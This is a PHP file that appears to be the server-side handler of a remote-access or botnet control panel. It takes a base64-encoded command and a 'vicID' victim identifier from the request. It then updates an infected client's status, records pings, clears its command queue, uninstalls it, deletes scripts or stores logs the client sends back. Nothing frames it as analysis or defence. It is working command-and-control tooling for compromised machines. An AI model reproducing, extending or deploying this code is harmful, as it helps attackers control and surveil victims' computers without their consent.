<?php
include_once 'classes/Database.php';
include_once APP_PATH . '/classes/Clients.php';
include_once APP_PATH . '/classes/Utils.php';

$utils = new Utils;

$client = new Clients;

$Y = DATA_SPLITTER;

$command = $utils->sanitize($utils->base64_decode_url($_GET['command']));
$ID = $utils->sanitize($utils->base64_decode_url($_GET['vicID']));
$data = $client->getClient($ID);

$A = explode(DATA_SPLITTER, $utils->sanitize($command));

switch ($A[0]) {
    case "Uninstall":
        $client->removeClient($ID);
        break;

    case "CleanCommands":
        $client->updateCommands($ID, $utils->base64_encode_url("Ping"));
        break;

    case "Offline":
        $client->updateStatus($ID, "Offline");
        break;

    case "Online":
        $client->updateStatus($ID, "Online");
        break;

    case 'Pinged':
        $client->pinged($ID, $data->pings);
        break;

    case 'DeleteScript':
        try {
            $script_name = $utils->sanitize($A[1]);
            if (strpos($script_name, '../') !== false) {
                $script_name = $utils->sanitize(trim($A[1], "../"));
            }
            @unlink(realpath("scripts/" . $script_name));
        } catch (Exception $e) {
        }
        break;
    case "NewLog":
        $client->new_log($ID, $utils->sanitize($A[1]), $utils->sanitize($A[2]));
        break;
    default:
        break;
}
